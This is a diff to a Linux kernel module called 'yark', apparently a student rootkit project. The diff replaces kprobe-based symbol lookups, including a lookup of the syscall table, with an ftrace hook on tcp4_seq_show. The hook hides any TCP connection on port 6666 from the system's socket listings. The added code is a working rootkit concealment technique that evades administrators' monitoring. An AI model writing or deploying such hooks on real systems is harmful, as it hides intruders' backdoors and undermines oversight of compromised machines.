@@ -1,6 +1,6 @@
 #include <linux/kernel.h>
-#include <linux/kprobes.h>
 #include <linux/module.h>
+#include "hook_helper.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Students from Institute of Information Engineering");
@@ -10,47 +10,38 @@ MODULE_VERSION("0.01");
 #define MODULE_NAME "yark"
 #define LOG_PREFIX "yark: "
 
-typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+//functions and args bellow are all for hidding ports
 
-void *search_function_with_kprobe(const char *symbol_name) {
-    void *addr;
-    struct kprobe kp = {.symbol_name = symbol_name};
-    if (register_kprobe(&kp) < 0) {
-        return NULL;
-    }
-    addr = kp.addr;
-    unregister_kprobe(&kp);
-    return addr;
+#include <linux/tcp.h>
+
+static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
+
+static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
+{
+    struct sock *sk = v;
+    if (sk != 0x1 && sk->sk_num == 0x1a0a)// 如果端口是6666,隐藏
+        return 0;
+    return orig_tcp4_seq_show(seq, v);
 }
 
-static int __init yark_init(void) {
-    kallsyms_lookup_name_t kallsyms_lookup_name;
-    unsigned long **sys_call_table;
+struct ftrace_hook hook111 = YARK_HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show);
+void hide_ports(void)
+{
+    fh_install_hook(&hook111);
+}
 
+static int __init yark_init(void)
+{
     pr_info(LOG_PREFIX "call yark_init()");
-
-    kallsyms_lookup_name = (kallsyms_lookup_name_t)search_function_with_kprobe(
-        "kallsyms_lookup_name");
-
-    pr_info(LOG_PREFIX "address of kallsyms_lookup_name: %px",
-            kallsyms_lookup_name);
-
-
-    void * tcp4_seq_show = (void*)search_function_with_kprobe(
-        "tcp4_seq_show");
-
-    pr_info(LOG_PREFIX "address of tcp4_seq_show: %px",
-            tcp4_seq_show);
-
-
-    sys_call_table = (unsigned long **)kallsyms_lookup_name("sys_call_table");
-
-    pr_info(LOG_PREFIX "address of sys_call_table: %px", sys_call_table);
-
+    hide_ports();
     return 0;
 }
 
-static void __exit yark_exit(void) { pr_info(LOG_PREFIX "call yark_exit()"); }
+static void __exit yark_exit(void)
+{
+    fh_remove_hook(&hook111);
+    pr_info(LOG_PREFIX "call yark_exit()");
+}
 
 module_init(yark_init);
 module_exit(yark_exit);
